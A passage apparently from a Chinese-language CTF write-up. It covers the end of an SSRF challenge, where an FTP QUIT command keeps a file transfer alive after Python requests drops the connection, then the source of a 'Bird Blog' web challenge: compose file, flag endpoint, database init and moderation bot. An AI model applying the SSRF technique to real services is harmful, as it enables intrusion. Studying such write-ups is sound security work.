+<p>但這會遇到另個問題：FTP 遇到太長的指令會回傳 <code>500 Command too long.</code>。這不是合理 http response，所以 python requests 碰到會直接 close connection（<a class="link" target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/v3.12.14/Lib/http/client.py#L323-L325">https://github.com/python/cpython/blob/v3.12.14/Lib/http/client.py#L323-L325<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link" target="_blank" rel="noopener" href="https://github.com/urllib3/urllib3/blob/2.7.0/src/urllib3/connectionpool.py#L839-L840">https://github.com/urllib3/urllib3/blob/2.7.0/src/urllib3/connectionpool.py#L839-L840<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link" target="_blank" rel="noopener" href="https://github.com/urllib3/urllib3/blob/2.7.0/src/urllib3/connectionpool.py#L850-L858">https://github.com/urllib3/urllib3/blob/2.7.0/src/urllib3/connectionpool.py#L850-L858<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link" target="_blank" rel="noopener" href="https://github.com/psf/requests/blob/v2.34.2/src/requests/adapters.py#L710-L711%EF%BC%89%EF%BC%8C%E9%80%99%E6%9C%83%E8%AE%93">https://github.com/psf/requests/blob/v2.34.2/src/requests/adapters.py#L710-L711），這會讓<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> pyftpdlib 的 <code>RETR</code> 還沒跑完就被中斷，造成對 Babblefish 的 SSRF 中斷。</p>
+<p>這時候可以用 QUIT；在 <code>RETR</code> 傳檔案時，如果收到 <code>QUIT</code>，會讓檔案傳完。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/giampaolo/pyftpdlib/blob/release-2.2.0/pyftpdlib/handlers/ftp/control.py#L1394-L1400</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ftp_QUIT</span>(<span class="params">self, line</span>):</span><br><span class="line">    <span class="comment"># [...]</span></span><br><span class="line">    <span class="comment"># From RFC-959:</span></span><br><span class="line">    <span class="comment"># If file transfer is in progress, the connection must remain</span></span><br><span class="line">    <span class="comment"># open for result response and the server will then close it.</span></span><br><span class="line">    <span class="comment"># We also stop responding to any further command.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.data_channel:</span><br><span class="line">        <span class="variable language_">self</span>._quit_pending = <span class="literal">True</span></span><br><span class="line">        <span class="variable language_">self</span>.del_channel()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="variable language_">self</span>._shutdown_connecting_dtp()</span><br><span class="line">        <span class="variable language_">self</span>.close_when_done()</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.authenticated <span class="keyword">and</span> <span class="variable language_">self</span>.username:</span><br><span class="line">        <span class="variable language_">self</span>.on_logout(<span class="variable language_">self</span>.username)</span><br></pre></td></tr></table></figure></div>
+
+<p>把上面這些合在一起就會拿到 flag 了。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bbb{w1ngsp4n_is_ab0ut_c0ll3ct1ng_b1rd_sh4ped_fri3nds:…}</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Web-Bird-Blog"><a href="#Web-Bird-Blog" class="headerlink" title="[Web] Bird Blog"></a>[Web] Bird Blog</h2><p>題目的 flag 放在 <code>flag</code> container 裡面</p>
+<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">bird_blog</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">blog_app:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./app</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">POSTGRES_URL:</span> <span class="string">postgres://${APP_USER:-appuser}:${APP_PASSWORD:-apppass}@127.0.0.1:5432/bird_blog</span></span><br><span class="line">      <span class="attr">CONFIG_BIND_ADDRESS:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">      <span class="attr">CONFIG_ALLOW_PRIVATE_IPS:</span> <span class="string">"false"</span></span><br><span class="line">      <span class="attr">BLOG_HOST:</span> <span class="string">http://host.docker.internal:8080</span> <span class="comment"># See NOTES.md!!</span></span><br><span class="line">    <span class="attr">extra_hosts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"host.docker.internal:host-gateway"</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">1337</span><span class="string">:1337</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">templates:/app/template</span></span><br><span class="line">  <span class="attr">bot:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./bot</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">"service:blog_app"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">BOT_POSTGRES_URL:</span> <span class="string">postgres://${BOT_USER:-botuser}:${BOT_PASSWORD:-botpass}@127.0.0.1:5432/bird_blog</span></span><br><span class="line">      <span class="attr">CONFIG_HOST:</span> <span class="string">http://localhost:8081</span></span><br><span class="line">      <span class="attr">BLOG_HOST:</span> <span class="string">http://host.docker.internal:8080</span> <span class="comment"># See NOTES.md!!</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">blog_app</span></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./db</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">"service:blog_app"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">POSTGRES_USER:</span> <span class="string">${POSTGRES_USER:-postgres}</span></span><br><span class="line">      <span class="attr">POSTGRES_PASSWORD:</span> <span class="string">${POSTGRES_PASSWORD:-postgres_password}</span></span><br><span class="line">      <span class="attr">POSTGRES_DB:</span> <span class="string">bird_blog</span></span><br><span class="line">      <span class="attr">APP_USER:</span> <span class="string">${APP_USER:-appuser}</span></span><br><span class="line">      <span class="attr">APP_PASSWORD:</span> <span class="string">${APP_PASSWORD:-apppass}</span></span><br><span class="line">      <span class="attr">BOT_USER:</span> <span class="string">${BOT_USER:-botuser}</span></span><br><span class="line">      <span class="attr">BOT_PASSWORD:</span> <span class="string">${BOT_PASSWORD:-botpass}</span></span><br><span class="line">      <span class="attr">SECRET_KEY:</span> <span class="string">${SECRET_KEY:-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_}</span> <span class="comment"># See NOTES.md!!</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">pgdata:/var/lib/postgresql/18/docker</span></span><br><span class="line">  <span class="attr">flag:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./flag</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">"service:blog_app"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">SECRET_KEY:</span> <span class="string">${SECRET_KEY:-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_}</span> <span class="comment"># See NOTES.md!!</span></span><br><span class="line">      <span class="attr">FLAG:</span> <span class="string">${FLAG:-bbb{you_forgot_to_set_the_flag_env_var}}</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">templates:</span> {}</span><br><span class="line">  <span class="attr">pgdata:</span> {}</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a><code>flag</code></h3><p>提交 <code>SECRET_KEY_HASH</code> 到 <code>flag</code> 就能拿到 flag。而 <code>SECRET_KEY</code> 也會被放到 <code>postgres</code> 裡面</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">"/submit"</span>, <span class="title function_">async</span> (request, reply) =&gt; {</span><br><span class="line">	<span class="keyword">const</span> { secretKey } = request.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">typeof</span> secretKey !== <span class="string">"string"</span>) {</span><br><span class="line">		<span class="keyword">return</span> reply.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">"Invalid request"</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (remainingAttempts &lt;= <span class="number">0</span>) {</span><br><span class="line">		<span class="keyword">return</span> reply.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">"No remaining attempts"</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> providedKeyHash = <span class="title function_">createHash</span>(<span class="string">"sha256"</span>).<span class="title function_">update</span>(secretKey).<span class="title function_">digest</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_">timingSafeEqual</span>(providedKeyHash, <span class="variable constant_">SECRET_KEY_HASH</span>)) {</span><br><span class="line">		<span class="keyword">return</span> reply.<span class="title function_">view</span>(<span class="string">"flag.hbs"</span>, { <span class="attr">flag</span>: <span class="variable constant_">FLAG</span> });</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		remainingAttempts--;</span><br><span class="line">		<span class="keyword">return</span> reply.<span class="title function_">view</span>(<span class="string">"index.hbs"</span>, { <span class="attr">error</span>: <span class="string">`Incorrect secret key. Remaining attempts: <span class="subst">${remainingAttempts}</span>`</span> });</span><br><span class="line">	}</span><br><span class="line">});</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="postgres"><a href="#postgres" class="headerlink" title="postgres"></a><code>postgres</code></h3><p><code>SECRET_KEY</code> 會被放進資料庫的 <code>secret_key</code> table 裡面。</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">psql -v ON_ERROR_STOP=1 --username <span class="string">"<span class="variable">$POSTGRES_USER</span>"</span> --dbname <span class="string">"<span class="variable">$POSTGRES_DB</span>"</span> &lt;&lt;-<span class="string">EOSQL</span></span><br><span class="line"><span class="string">    CREATE USER $APP_USER WITH PASSWORD '$APP_PASSWORD';</span></span><br><span class="line"><span class="string">    GRANT ALL PRIVILEGES ON DATABASE $POSTGRES_DB TO $APP_USER;</span></span><br><span class="line"><span class="string">    GRANT ALL PRIVILEGES ON SCHEMA public TO $APP_USER;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CREATE TABLE secret_key (secret_key text);</span></span><br><span class="line"><span class="string">    INSERT INTO secret_key VALUES ('$SECRET_KEY');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    GRANT SELECT ON secret_key TO $APP_USER;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CREATE USER $BOT_USER WITH PASSWORD '$BOT_PASSWORD';</span></span><br><span class="line"><span class="string">    GRANT CONNECT ON DATABASE $POSTGRES_DB TO $BOT_USER;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CREATE SCHEMA bot AUTHORIZATION $BOT_USER;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CREATE TABLE bot.state (</span></span><br><span class="line"><span class="string">        key   text PRIMARY KEY,</span></span><br><span class="line"><span class="string">        value text NOT NULL</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    ALTER TABLE bot.state OWNER TO $BOT_USER;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    REVOKE ALL ON SCHEMA bot FROM PUBLIC;</span></span><br><span class="line"><span class="string">    REVOKE ALL ON SCHEMA bot FROM $APP_USER;</span></span><br><span class="line"><span class="string">EOSQL</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="bot"><a href="#bot" class="headerlink" title="bot"></a><code>bot</code></h3><p>Bot 每隔一段時間會去看一次 comments。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/bot/src/bot.mjs:225</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) {</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Checking for unmoderated comments"</span>);</span><br><span class="line">	<span class="keyword">try</span> {</span><br><span class="line">		<span class="keyword">const</span> shouldCheckAgain = <span class="keyword">await</span> <span class="title function_">checkComments</span>();</span><br><span class="line">		<span class="keyword">if</span> (!shouldCheckAgain) {</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"No unmoderated comments, waiting 5 seconds before checking again"</span>);</span><br><span class="line">			<span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">5000</span>));</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Checking for more unmoderated comments immediately"</span>);</span><br><span class="line">		}</span><br><span class="line">	} <span class="keyword">catch</span> (err) {</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">"Error while checking comments, waiting 5 seconds before trying again"</span>, err);</span><br><span class="line">		<span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">5000</span>));</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>看 comments 的時候會去審核；如果留言裡面有 <code>cat</code> 就會按 <code>form.approve</code> 按鈕，反之則是 <code>form.reject</code>。<code>CONFIG_HOST</code> 是 admin 用的網頁 <code>:8081</code>。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/bot/src/bot.mjs:152</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">checkComments</span>(<span class="params"></span>) { <span class="comment">// returns whether or not to immediately check again</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">await</span> <span class="title function_">withBrowser</span>(<span class="title function_">async</span> (browser) =&gt; {</span><br><span class="line">		<span class="keyword">const</span> moderationPage = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">		<span class="keyword">await</span> moderationPage.<span class="title function_">goto</span>(<span class="string">`<span class="subst">${CONFIG_HOST}</span>/comments`</span>, { <span class="attr">waitUntil</span>: <span class="string">"networkidle0"</span> });</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> currentLastUpdated = <span class="keyword">await</span> <span class="title function_">evaluateWithTimeout</span>(moderationPage, <span class="function">() =&gt;</span> <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">"footer"</span>)?.<span class="property">textContent</span>?.<span class="title function_">trim</span>() ?? <span class="string">""</span>);</span><br><span class="line">		<span class="keyword">await</span> <span class="title function_">setStateIfAbsent</span>(<span class="string">"last_updated_baseline"</span>, currentLastUpdated);</span><br><span class="line">		<span class="keyword">const</span> baseline = <span class="keyword">await</span> <span class="title function_">getState</span>(<span class="string">"last_updated_baseline"</span>);</span><br><span class="line">		<span class="keyword">if</span> (baseline !== currentLastUpdated) {</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"I don't remember reconfiguring the blog, what happened here?? Moderating comments can wait until I get to the bottom of this existential crisis"</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> firstUnmoderatedComment = <span class="keyword">await</span> <span class="title function_">evaluateWithTimeout</span>(moderationPage, <span class="function">() =&gt;</span> {</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">"tr:has(form.approve)"</span>)?.<span class="property">id</span>;</span><br><span class="line">		});</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (firstUnmoderatedComment === <span class="literal">undefined</span>) {</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> <span class="title function_">approve</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">			<span class="keyword">await</span> moderationPage.<span class="title function_">bringToFront</span>();</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Approving comment"</span>);</span><br><span class="line">			<span class="keyword">await</span> moderationPage.<span class="title function_">click</span>(<span class="string">`#<span class="subst">${firstUnmoderatedComment}</span> form.approve button`</span>);</span><br><span class="line">			<span class="keyword">await</span> moderationPage.<span class="title function_">waitForNavigation</span>({ <span class="attr">waitUntil</span>: <span class="string">"networkidle0"</span> });</span><br><span class="line">		};</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> <span class="title function_">reject</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">			<span class="keyword">await</span> moderationPage.<span class="title function_">bringToFront</span>();</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Rejecting comment"</span>);</span><br><span class="line">			<span class="keyword">await</span> moderationPage.<span class="title function_">click</span>(<span class="string">`#<span class="subst">${firstUnmoderatedComment}</span> form.reject button`</span>);</span><br><span class="line">			<span class="keyword">await</span> moderationPage.<span class="title function_">waitForNavigation</span>({ <span class="attr">waitUntil</span>: <span class="string">"networkidle0"</span> });</span><br><span class="line">		};</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Found unmoderated comment with id <span class="subst">${firstUnmoderatedComment}</span>`</span>);</span><br><span class="line">		<span class="keyword">try</span> {</span><br><span class="line">			<span class="keyword">const</span> [commentPageTarget] = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([</span><br><span class="line">				browser.<span class="title function_">waitForTarget</span>(<span class="function">(<span class="params">target</span>) =&gt;</span> target.<span class="title function_">url</span>().<span class="title function_">startsWith</span>(<span class="string">`<span class="subst">${BLOG_HOST}</span>/comments/`</span>), { <span class="attr">timeout</span>: <span class="number">10000</span> }),</span><br><span class="line">				moderationPage.<span class="title function_">click</span>(<span class="string">`#<span class="subst">${firstUnmoderatedComment}</span> form.view button`</span>)</span><br><span class="line">			]);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">const</span> commentPage = <span class="keyword">await</span> commentPageTarget.<span class="title function_">page</span>();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (commentPage === <span class="literal">undefined</span>) {</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">"Failed to find comment page"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Take a moment to read the comment...</span></span><br><span class="line">			<span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">30000</span>));</span><br><span class="line">			<span class="keyword">const</span> commentHTML = <span class="keyword">await</span> <span class="title function_">evaluateWithTimeout</span>(commentPage, <span class="function">() =&gt;</span> <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">".comment"</span>)?.<span class="property">innerHTML</span> ?? <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (commentHTML.<span class="title function_">includes</span>(<span class="string">"cat"</span>)) {</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"All of this talk of cats will scare my readers, rejecting comment"</span>);</span><br><span class="line">				<span class="keyword">await</span> <span class="title function_">reject</span>();</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			} <span class="keyword">else</span> {</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Thanks for not talking about cats, approving comment"</span>);</span><br><span class="line">				<span class="keyword">await</span> <span class="title function_">approve</span>();</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			}</span><br><span class="line">		} <span class="keyword">catch</span> (error) {</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Something went wrong and that makes me suspicious, rejecting comment just to be safe"</span>);</span><br><span class="line">			<span class="keyword">await</span> <span class="title function_">reject</span>();</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		}</span><br><span class="line">	});</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="blog-app"><a href="#blog-app" class="headerlink" title="blog_app"></a><code>blog_app</code></h3><p>這個 container 會開兩個服務，一個開在 <code>:8081</code>，給 admin 用；另一個開在 <code>:8080</code>。</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bird-blog/app/src/index.mjs</span></span><br><span class="line"><span class="keyword">import</span> { startAdminService } <span class="keyword">from</span> <span class="string">"./admin.mjs"</span>;</span><br><span class="line"><span class="keyword">import</span> { startBlogService } <span class="keyword">from</span> <span class="string">"./blog.mjs"</span>;</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">"SIGINT"</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Received SIGINT. Shutting down..."</span>);</span><br><span class="line">	process.<span class="title function_">exit</span>(<span class="number">0</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">startAdminService</span>();</span><br><span class="line">} <span class="keyword">catch</span> (err) {</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">"Failed to start admin service:"</span>, err);</span><br><span class="line">	process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">startBlogService</span>();</span><br><span class="line">} <span class="keyword">catch</span> (err) {</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">"Failed to start blog service:"</span>, err);</span><br><span class="line">	process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p><code>bot</code> 會去看的 admin 頁面在這：</p>
